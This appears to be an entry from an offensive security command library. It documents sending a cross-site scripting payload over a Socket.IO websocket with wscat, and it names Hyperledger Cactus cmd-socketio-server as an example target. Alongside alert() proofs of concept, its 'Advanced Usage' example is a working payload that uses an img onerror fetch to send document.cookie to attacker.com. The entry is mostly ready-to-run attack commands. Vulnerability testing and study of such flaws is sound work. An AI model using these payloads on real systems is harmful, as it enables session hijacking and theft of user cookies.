---
data: >-
  echo '42["command_event",{"input":"<script>alert(\"XSS via
  Socket.IO\")</script>"}]' | wscat -c
  ws://target-host:3000/socket.io/?EIO=4&transport=websocket
tags:
  - xss
  - injection
  - socketio
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:31.822Z'
id: 496d530b-6e7a-414f-abc5-a4a4f990021b
verified: false
validated: true
submitted: true
---
# socketio-emit-xss

## Command

```bash
echo '42["command_event",{"input":"<script>alert(\"XSS via Socket.IO\")</script>"}]' | wscat -c ws://target-host:3000/socket.io/?EIO=4&transport=websocket
```

## Description

This command sends a Socket.IO emit message with a malicious XSS payload to test for reflected vulnerabilities in command handling, such as in Hyperledger Cactus cmd-socketio-server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `42` | Socket.IO message type for events | Yes |
| `command_event` | Name of the vulnerable event | Yes |
| `input` | Payload field with script injection | Yes |
| `target-host` | Target hostname | Yes |

## Examples

### Basic Usage

```bash
echo '42["command_event",{"input":"<script>alert(\"Test\")</script>"}]' | wscat -c ws://target:3000/socket.io/?EIO=4
```

### Advanced Usage

```bash
echo '42["custom_cmd",{"data":"<img src=x onerror=fetch(\'http://attacker.com/steal?cookie=\' + document.cookie)>"}]' | wscat -c ws://target:3000/socket.io/?EIO=4&transport=websocket
```

## Expected Output

Server echoes back the message like '3["command_event",{"input":"<script>alert(\"XSS via Socket.IO\")</script>"}]'. If vulnerable, the payload executes in the client browser, e.g., triggering an alert.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-in-SocketIO-Handling]]
